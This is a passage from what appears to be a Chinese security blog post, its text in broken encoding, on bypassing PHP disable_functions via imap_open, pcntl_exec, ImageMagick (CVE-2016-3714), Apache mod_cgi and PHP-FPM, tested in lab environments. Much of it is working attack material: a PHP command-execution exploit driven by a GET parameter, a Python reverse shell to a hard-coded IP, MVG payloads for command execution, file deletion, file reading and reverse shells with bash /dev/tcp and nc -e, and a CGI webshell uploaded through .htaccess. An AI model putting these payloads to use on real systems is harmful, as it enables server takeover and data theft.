class="headerlink" title="Âà©Áî®imap_open()ÁªïËøá"></a>Âà©Áî®imap_open()ÁªïËøá</h2><h3 id="Âà©Áî®Êù°‰ª∂-3"><a href="#Âà©Áî®Êù°‰ª∂-3" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>ÂÆâË£Ö‰∫ÜPHPÁöÑimapÊâ©Â±ï</li><li>php.ini‰∏≠ÂºÄÂêØimap.enable_insecure_rshÈÄâÈ°π‰∏∫On</li><li>PHP 5.6.0Ëá≥PHP 5.6.38ÔºõPHP 7.0.0Ëá≥PHP 7.0.32ÔºõPHP 7.1.0Ëá≥PHP 7.1.24ÔºõPHP 7.2.0Ëá≥PHP 7.2.12<br>ÂÖàÂÆâË£Ö‰∏Ä‰∏ãimapÊâ©Â±ï<code>apt-get install php-imap</code>ÁÑ∂ÂêéÂú®php.ini‰∏≠‰øÆÊîπimap.enable_insecure_rsh‰∏∫OnÂÜçÈáçÂêØÊúçÂä°<br>![[Pasted image 20231127145433.png]]<br>Âü∫Êú¨ÂéüÁêÜÂ¶Ç‰∏ãÔºåÂ§ßÊ¶ÇÂ∞±ÊòØimap_openÂáΩÊï∞Ê≤°ÊúâÂØπ‰º†ÈÄíÁöÑÈÇÆÁÆ±ÂêçÁß∞ÂÅöÂ•ΩÂÆâÂÖ®Ê†°È™å<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP ÁöÑimap_openÂáΩÊï∞‰∏≠ÁöÑÊºèÊ¥ûÂèØËÉΩÂÖÅËÆ∏ÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ãÊîªÂáªËÄÖÂú®ÁõÆÊ†áÁ≥ªÁªü‰∏äÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇËØ•ÊºèÊ¥ûÁöÑÂ≠òÂú®ÊòØÂõ†‰∏∫ÂèóÂΩ±ÂìçÁöÑËΩØ‰ª∂ÁöÑimap_openÂáΩÊï∞Âú®Â∞ÜÈÇÆÁÆ±ÂêçÁß∞‰º†ÈÄíÁªôrshÊàñsshÂëΩ‰ª§‰πãÂâç‰∏çÊ≠£Á°ÆÂú∞ËøáÊª§ÈÇÆÁÆ±ÂêçÁß∞„ÄÇÂ¶ÇÊûúÂêØÁî®‰∫ÜrshÂíåsshÂäüËÉΩÂπ∂‰∏îrshÂëΩ‰ª§ÊòØsshÂëΩ‰ª§ÁöÑÁ¨¶Âè∑ÈìæÊé•ÔºåÂàôÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂêëÁõÆÊ†áÁ≥ªÁªüÂèëÈÄÅÂåÖÂê´-oProxyCommandÂèÇÊï∞ÁöÑÊÅ∂ÊÑèIMAPÊúçÂä°Âô®ÂêçÁß∞Êù•Âà©Áî®Ê≠§ÊºèÊ¥û„ÄÇÊàêÂäüÁöÑÊîªÂáªÂèØËÉΩÂÖÅËÆ∏ÊîªÂáªËÄÖÁªïËøáÂÖ∂‰ªñÁ¶ÅÁî®ÁöÑexec ÂèóÂΩ±ÂìçËΩØ‰ª∂‰∏≠ÁöÑÂäüËÉΩÔºåÊîªÂáªËÄÖÂèØÂà©Áî®Ëøô‰∫õÂäüËÉΩÂú®ÁõÆÊ†áÁ≥ªÁªü‰∏äÊâßË°å‰ªªÊÑèshellÂëΩ‰ª§„ÄÇ</span><br></pre></td></tr></table></figure>EXP<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echot&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">imap_open</span>(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;nnError: &quot;</span>.<span class="title function_ invoke__">imap_last_error</span>());</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>ËøôÈáåÊàëÊú∫Âô®‰∏äÁöÑphpÁâàÊú¨‰∏çË°åÔºåÊáíÂæóÂ§çÁé∞‰∫Ü</li></ul><h2 id="Âà©Áî®-pcntl-exec"><a href="#Âà©Áî®-pcntl-exec" class="headerlink" title="Âà©Áî® pcntl_exec"></a>Âà©Áî® pcntl_exec</h2><h3 id="Âà©Áî®Êù°‰ª∂-4"><a href="#Âà©Áî®Êù°‰ª∂-4" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>PHPÂÆâË£ÖÂπ∂ÂêØÁî®‰∫ÜpcntlÊèí‰ª∂<br>Âà©Áî®pcntl_exec()ÔºåÂÆÉÊòØpcntlÊèí‰ª∂‰∏ìÊúâÁöÑÂëΩ‰ª§ÊâßË°åÂáΩÊï∞Êù•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÂáΩÊï∞Ôºå‰ΩÜÊòØËøô‰∏™ÂëΩ‰ª§Ê≤°ÊúâÂõûÊòæÔºåÊâÄ‰ª•Â∏∏Áî®Êù•ÂèçÂºπshellÔºåÂú®webÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™phpÊñá‰ª∂ÔºåÂä†ÂÖ•‰∏ãÈù¢‰ª£Á†Å<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure>ÁÑ∂ÂêéËÆøÈóÆËøô‰∏™Êñá‰ª∂Âç≥ÂèØÂèçÂºπÊàêÂäüÔºåÊàëËøôÈáåÊ≤°Ë£ÖËøô‰∏™Êèí‰ª∂ÔºåË£ÖËøô‰∏™ÊØîËæÉÈ∫ªÁÉ¶Â∞±ÊáíÂæóÂ§çÁé∞‰∫ÜÔºåËøô‰∏™‰πüÁÆóÊòØÈªëÂêçÂçïÁªïËøá‰∫Ü</li></ul><h2 id="Âà©Áî®-ImageMagick-bypass"><a href="#Âà©Áî®-ImageMagick-bypass" class="headerlink" title="Âà©Áî® ImageMagick bypass"></a>Âà©Áî® ImageMagick bypass</h2><h3 id="Âà©Áî®Êù°‰ª∂-5"><a href="#Âà©Áî®Êù°‰ª∂-5" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>ÁõÆÊ†á‰∏ªÊú∫ÂÆâË£Ö‰∫ÜÊºèÊ¥ûÁâàÊú¨ÁöÑ imagemagickÔºà&lt;&#x3D; 3.3.0Ôºâ</li><li>ÂÆâË£Ö‰∫Ü php-imagick ÊãìÂ±ïÂπ∂Âú® php.ini ‰∏≠ÂêØÁî®</li><li>ÁºñÂÜô php ÈÄöËøá new Imagick ÂØπË±°ÁöÑÊñπÂºèÊù•Â§ÑÁêÜÂõæÁâáÁ≠âÊ†ºÂºèÊñá‰ª∂</li><li>PHP &gt;&#x3D; 5.4</li></ul><h3 id="Âà©Áî®ÊñπÊ≥ï"><a href="#Âà©Áî®ÊñπÊ≥ï" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>ÂéüÁêÜÂèÇËÄÉÔºö<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">CVE-2016-3714 - ImageMagick ÂëΩ‰ª§ÊâßË°åÂàÜÊûê | Á¶ªÂà´Ê≠å (leavesongs.com)</a><br>Áõ¥Êé•Âú®Êñá‰ª∂‰∏ä‰º†Â§Ñ‰∏ä‰º†jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|id&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>idÂ§Ñ‰∏∫ÂëΩ‰ª§ÊâßË°åÁöÑÂú∞Êñπ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657507.png" alt="image-20231206165723432"><br>Âè¶Â§ñËøòÂèØ‰ª•ËøõË°åÂèçÂºπshell„ÄÅssrf„ÄÅ‰ªªÊÑèÊñá‰ª∂Âà†Èô§„ÄÅ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÁ≠âÔºå‰ΩÜÊòØÊ≤°Â§çÁé∞ÊàêÂäü<br><strong>SSRF</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(http://example.com/)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>‰ªªÊÑèÊñá‰ª∂Âà†Èô§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;ephemeral:/tmp/delete.txt&#x27;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure><p>‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;label:@/etc/hosts&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>ÂèçÂºπshellÔºå‰∏ãÈù¢Ëøô‰∏§ÁßçÊñπÂºèÈÉΩÂ§±Ë¥•‰∫Ü‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Á¨¨‰∏ÄÁßçÊñπÂºè</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|bash -i &gt;&amp; /dev/tcp/IP/6666 0&gt;&amp;1&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br><span class="line"></span><br><span class="line">Á¨¨‰∫åÁßçÊñπÂºè</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|nc -e /bin/bash ip 6666&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>Âè¶Â§ñÁúãÂà´ÁöÑÊñáÁ´†Áõ¥Êé•Áªô‰∫Üexp‰ΩÜÊ≤°ÂÖ∑‰ΩìÁöÑÂà©Áî®ÊñπÂºèÔºåÊàëËøôÈáåÊ≤°ÊúâÁéØÂ¢É‰πüÊó†Ê≥ïÂéªÈ™åËØÅÊÄé‰πàÂà©Áî®Ôºå‰ª•ÂêéÈÅáÂà∞‰∫ÜÂÜçÂºÑÂêß„ÄÇ„ÄÇ„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Â∫îËØ•Â∞±ÊòØÊãøÂà∞shellÂêé‰∏ä‰º†Ëøô‰∏™Êñá‰ª∂ÁÑ∂ÂêéÂåÖÂê´ÂÆÉÂëΩ‰ª§ÊâßË°å</p><h2 id="Âà©Áî®-Apache-Mod-CGI"><a href="#Âà©Áî®-Apache-Mod-CGI" class="headerlink" title="Âà©Áî® Apache Mod CGI"></a>Âà©Áî® Apache Mod CGI</h2><h3 id="Âà©Áî®Êù°‰ª∂-6"><a href="#Âà©Áî®Êù°‰ª∂-6" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>Apache + PHP (apache ‰ΩøÁî® apache_mod_php)</li><li>Apache ÂºÄÂêØ‰∫Ü <code>cgi</code>, <code>rewrite</code></li><li>Web ÁõÆÂΩïÁªô‰∫Ü <code>AllowOverride</code> ÊùÉÈôê</li><li>ÂΩìÂâçÁõÆÂΩïÂèØÂÜô</li></ul><h3 id="Âà©Áî®ÂéüÁêÜ"><a href="#Âà©Áî®ÂéüÁêÜ" class="headerlink" title="Âà©Áî®ÂéüÁêÜ"></a>Âà©Áî®ÂéüÁêÜ</h3><p><strong>ÂÖ≥‰∫éMod CGI</strong><br>Êó©ÊúüÁöÑ<a href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1&spm=1001.2101.3001.7020">WebÊúçÂä°</a>Âô®ÔºåÂè™ËÉΩÂìçÂ∫îÊµèËßàÂô®ÂèëÊù•ÁöÑHTTPÈùôÊÄÅËµÑÊ∫êÁöÑËØ∑Ê±ÇÔºåÂπ∂Â∞ÜÂ≠òÂÇ®Âú®ÊúçÂä°Âô®‰∏≠ÁöÑÈùôÊÄÅËµÑÊ∫êËøîÂõûÁªôÊµèËßàÂô®„ÄÇÈöèÁùÄWebÊäÄÊúØÁöÑÂèëÂ±ïÔºåÈÄêÊ∏êÂá∫Áé∞‰∫ÜÂä®ÊÄÅÊäÄÊúØÔºå‰ΩÜÊòØWebÊúçÂä°Âô®Âπ∂‰∏çËÉΩÂ§üÁõ¥Êé•ËøêË°åÂä®ÊÄÅËÑöÊú¨Ôºå‰∏∫‰∫ÜËß£ÂÜ≥WebÊúçÂä°Âô®‰∏éÂ§ñÈÉ®Â∫îÁî®Á®ãÂ∫èÔºàCGIÁ®ãÂ∫èÔºâ‰πãÈó¥Êï∞ÊçÆ‰∫íÈÄöÔºå‰∫éÊòØÂá∫Áé∞‰∫ÜCGIÔºàCommon Gateway InterfaceÔºâÈÄöÁî®ÁΩëÂÖ≥Êé•Âè£„ÄÇÁÆÄÂçïÁêÜËß£ÔºåÂèØ‰ª•ËÆ§‰∏∫CGIÊòØWebÊúçÂä°Âô®ÂíåËøêË°åÂÖ∂‰∏äÁöÑÂ∫îÁî®Á®ãÂ∫èËøõË°å‚Äú‰∫§ÊµÅ‚ÄùÁöÑ‰∏ÄÁßçÁ∫¶ÂÆö„ÄÇ</p><p>ÂΩìÈÅáÂà∞Âä®ÊÄÅËÑöÊú¨ËØ∑Ê±ÇÊó∂ÔºåWebÊúçÂä°Âô®‰∏ªËøõÁ®ãÂ∞±‰ºöForkÂàõÂª∫Âá∫‰∏Ä‰∏™Êñ∞ÁöÑËøõÁ®ãÊù•ÂêØÂä®<a href="https://so.csdn.net/so/search?q=CGI&spm=1001.2101.3001.7020">CGI</a>Á®ãÂ∫èÔºåËøêË°åÂ§ñÈÉ®CÁ®ãÂ∫èÊàñPerl„ÄÅPHPËÑöÊú¨Á≠âÔºå‰πüÂ∞±ÊòØÂ∞ÜÂä®ÊÄÅËÑöÊú¨‰∫§ÁªôCGIÁ®ãÂ∫èÊù•Â§ÑÁêÜ„ÄÇËøôÊ†∑ÔºåÊØèÊ¨°Áî®Êà∑ËØ∑Ê±ÇÂä®ÊÄÅËÑöÊú¨ÔºåWebÊúçÂä°Âô®ÈÉΩË¶ÅÈáçÊñ∞ForkÂàõÂª∫‰∏Ä‰∏™Êñ∞ËøõÁ®ãÂéªÂêØÂä®CGIÁ®ãÂ∫èÔºåÁî±CGIÁ®ãÂ∫èÊù•Â§ÑÁêÜÂä®ÊÄÅËÑöÊú¨ÔºåÂ§ÑÁêÜÂÆåÊàêÂêéËøõÁ®ãÈöè‰πãÂÖ≥Èó≠ÔºåÂÖ∂ÊïàÁéáÊòØÈùûÂ∏∏‰Ωé‰∏ãÁöÑ„ÄÇ</p><p>ËÄåÂØπ‰∫éMod CGIÔºåWebÊúçÂä°Âô®ÂèØ‰ª•ÂÜÖÁΩÆPerl<a href="https://so.csdn.net/so/search?q=%E8%A7%A3%E9%87%8A%E5%99%A8&spm=1001.2101.3001.7020">Ëß£ÈáäÂô®</a>ÊàñPHPËß£ÈáäÂô®„ÄÇ‰πüÂ∞±ÊòØËØ¥Â∞ÜËøô‰∫õËß£ÈáäÂô®ÂÅöÊàêÊ®°ÂùóÁöÑÊñπÂºèÔºåWebÊúçÂä°Âô®‰ºöÂú®ÂêØÂä®ÁöÑÊó∂ÂÄôÂ∞±ÂêØÂä®Ëøô‰∫õËß£ÈáäÂô®„ÄÇÂΩìÊúâÊñ∞ÁöÑÂä®ÊÄÅËØ∑Ê±ÇËøõÊù•Êó∂ÔºåWebÊúçÂä°Âô®Â∞±ÊòØËá™Â∑±Ëß£ÊûêËøô‰∫õÂä®ÊÄÅËÑöÊú¨ÔºåÁúÅÂæóÈáçÊñ∞Fork‰∏Ä‰∏™ËøõÁ®ãÔºåÊïàÁéáÊèêÈ´ò‰∫Ü„ÄÇ</p><p>ApacheÂú®ÈÖçÁΩÆÂºÄÂêØCGIÂêéÂèØ‰ª•Áî®ScriptAliasÊåá‰ª§ÊåáÂÆö‰∏Ä‰∏™ÁõÆÂΩïÔºåÊåáÂÆöÁöÑÁõÆÂΩï‰∏ãÈù¢‰æøÂèØ‰ª•Â≠òÊîæÂèØÊâßË°åÁöÑCGIÁ®ãÂ∫è„ÄÇËã•ÊòØÊÉ≥‰∏¥Êó∂ÂÖÅËÆ∏‰∏Ä‰∏™ÁõÆÂΩïÂèØ‰ª•ÊâßË°åCGIÁ®ãÂ∫èÂπ∂‰∏î‰ΩøÂæóÊúçÂä°Âô®Â∞ÜËá™ÂÆö‰πâÁöÑÂêéÁºÄËß£Êûê‰∏∫CGIÁ®ãÂ∫èÊâßË°åÔºåÂàôÂèØ‰ª•Âú®ÁõÆÁöÑÁõÆÂΩï‰∏ã‰ΩøÁî®htaccessÊñá‰ª∂ËøõË°åÈÖçÁΩÆÔºåÂ¶Ç‰∏ãÔºö</p><blockquote><p>Options +ExecCGIAddHandler cgi-script .xxx</p></blockquote><p>ËøôÊ†∑‰æø‰ºöÂ∞ÜÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÁöÑ.xxxÊñá‰ª∂ÂΩìÂÅöCGIÁ®ãÂ∫èÊâßË°å‰∫Ü„ÄÇ</p><p><strong>Âç≥webÊúçÂä°Âô®ÈÅáÂà∞Âä®ÊÄÅËØ∑Ê±ÇÊó∂ÔºåÂç≥ÁΩëÈ°µ‰∏äÁöÑÊï∞ÊçÆÊòØ‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ÊàñËÄÖÂÖ∂ÂÆÉÂú∞ÊñπË∞ÉÁî®ÁöÑËØ∑Ê±ÇÔºåwebÊúçÂä°Âô®Â∞±‰ºö‰∫§ÁªôCGIÂ§ÑÁêÜÔºå‰æãÂ¶ÇphpËß£ÈáäÂô®ÔºåÁÑ∂ÂêéÂú®ÈÖçÁΩÆÊñá‰ª∂ÔºàÂ¶ÇhtaccessÔºâ‰∏≠ÂèØ‰ª•ËÆæÁΩÆÊüêÊüêÂêéÁºÄ‰ª•CGIÁ®ãÂ∫èËøêË°åÂ∞±ÂèØ‰ª•ÁªïËøádisable_functions</strong></p><h3 id="Âà©Áî®ÊñπÊ≥ï-1"><a href="#Âà©Áî®ÊñπÊ≥ï-1" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>ËøôÈáåÁî®<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">ËöÅÂâëÁöÑdocker</a>ÂÅöÁéØÂ¢ÉÂ§çÁé∞ÔºåÂ¶ÇÊûúËßâÂæóÈ∫ªÁÉ¶‰πüÂèØ‰ª•Áõ¥Êé•Âú®ctfhub‰∏äÁî®Áé∞ÊàêÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657058.png" alt="image-20231206165740013"><br>ÊâßË°å‰∏Ä‰∏ãphpinfoÁúãÁúãÁ¶ÅÁî®ÂáΩÊï∞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv,</span><br></pre></td></tr></table></figure><p>Â§ßÈÉ®ÂàÜÈÉΩË¢´Á¶ÅÁî®‰∫ÜÔºåËöÅÂâëËøûÊé•ÁÑ∂ÂêéÂéªÁªïËøá<br>webÁõÆÂΩï‰∏ã‰∏ä‰º†<code>.htaccess</code>Êñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†shell.ant</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo Content-type: text/html</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">echo&amp;&amp;id</span><br></pre></td></tr></table></figure><p>Áî±‰∫éÁõÆÊ†áÊòØliunxÁ≥ªÁªü,linux‰∏≠CGIÊØîËæÉ‰∏•Ê†º„ÄÇËøôÈáå‰πüÈúÄË¶ÅÂéªliunxÁ≥ªÁªüÂàõÂª∫Êñá‰ª∂‰∏ä‰º†,Â¶ÇÊûú‰ΩøÁî®windowsÂàõÂª∫Êñá‰ª∂Âπ∂‰∏ä‰º†ÊòØÊó†Ê≥ïËß£ÊûêÁöÑ„ÄÇËøôÈáåÊàëÊØîËæÉÂê¨ËØùÁõ¥Êé•ÂéªLinux‰∏äÂàõÂª∫‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658850.png" alt="image-20231206165804798"><br>Áõ¥Êé•ËÆøÈóÆshell.antÂá∫ÈîôÔºåÊùÉÈôêÈóÆÈ¢ò<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658036.png" alt="image-20231206165813940"><br>Áõ¥Êé•‰ΩøÁî®ËöÅÂâë‰øÆÊîπÊùÉÈôê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658107.png" alt="image-20231206165823026"><br>ÁÑ∂ÂêéÂÜçËÆøÈóÆÂèØÁúãÂà∞ÂëΩ‰ª§ÊâßË°åÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659170.png" alt="image-20231206165847169"><br>ÁªèÊµãËØïËøôÈáåcat„ÄÅifconfigÁ≠âÂëΩ‰ª§Áî®‰∏ç‰∫ÜÔºåctfhubÂèØ‰ª•Áî®ifconfig‰ΩÜÊòØcat‰πüÁî®‰∏ç‰∫ÜtacÂèØÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659525.png" alt="image-20231206165953463"></p><p>ÂêéÈù¢ÂèëÁé∞Â∫îËØ•ÊòØÊàëÂÇªÈÄº‰∫ÜÔºåcatÁöÑflagÔºå‰ΩÜÊòØflagÊòØÁõ¥Êé•cat‰∏ç‰∫ÜÁöÑ</p><h2 id="Âà©Áî®ÊîªÂáªPHP-FPM"><a href="#Âà©Áî®ÊîªÂáªPHP-FPM" class="headerlink" title="Âà©Áî®ÊîªÂáªPHP-FPM"></a>Âà©Áî®ÊîªÂáªPHP-FPM</h2><p>FPMÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™fastcgiÂçèËÆÆËß£ÊûêÂô®ÔºåÊúçÂä°Âô®‰∏≠Èó¥‰ª∂Â∞ÜÁî®Êà∑ËØ∑Ê±ÇÊåâÁÖßfastcgiÁöÑËßÑÂàôÊâìÂåÖÂ•ΩÈÄöËøáTCP‰º†ÁªôFPM„ÄÇFPMÊåâÁÖßfastcgiÁöÑÂçèËÆÆÂ∞ÜTCPÊµÅËß£ÊûêÊàêÁúüÊ≠£ÁöÑÊï∞ÊçÆÔºåÂæóÂà∞ÊâßË°åËØ•ÂáΩÊï∞ÁöÑÁéØÂ¢ÉÂèòÈáè„ÄÇPHP-FPMÊãøÂà∞ 